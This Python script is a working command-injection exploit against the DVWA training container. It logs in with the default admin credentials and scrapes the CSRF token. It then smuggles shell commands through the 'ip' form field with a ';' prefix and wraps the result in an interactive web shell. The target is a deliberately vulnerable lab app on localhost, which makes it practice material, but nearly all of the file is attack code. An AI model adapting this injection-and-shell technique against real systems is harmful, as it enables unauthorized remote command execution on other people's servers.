#!/bin/python3
from webshellify import Webshellify

import requests as req
import re
import urllib

HOST = "localhost"
PORT = 80

"""
This script is make to work with docker container "vulnerables/web-dvwa". It
requires a valid, authorized PHPSSID cookie to be passed into it (either hard
coded or programatically fetched)
"""
def main():
    shell = Webshellify(exploit, debug=False)
    shell.create_shell(urlencode=False)

def exploit(cmd):
    sess_cookie = get_session()

    resp = req.request(
            "POST",
            f"http://{HOST}:{PORT}/vulnerabilities/exec/#",
            cookies={
                "security": "low",
                "PHPSESSID": sess_cookie,
            },
            data=f"ip=;{urllib.parse.quote(cmd)}&Submit=Submit",
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
    # print(resp.text)
    return resp.text

def get_session():
    resp = req.request("GET", "http://localhost/login.php")
    user_token_regex = re.compile("<input.*name=['\"]user_token['\"].*value=['\"](.*)['\"].*>")
    user_token = user_token_regex.findall(resp.text)[0]
    sess_cookie = resp.cookies.get("PHPSESSID")

    print(f"[info] aquired token: {user_token}")
    print(f"[info] aquired cookie: {sess_cookie}")

    resp2 = req.request(
        "POST",
        "http://localhost/login.php",
        data=f"username=admin&password=password&Login=Login&user_token={user_token}",
        headers={
            "Content-Type": "application/x-www-form-urlencoded"
        },
        cookies={
            "PHPSESSID": sess_cookie
        }
    )

    return sess_cookie

if __name__ == "__main__":
    main()
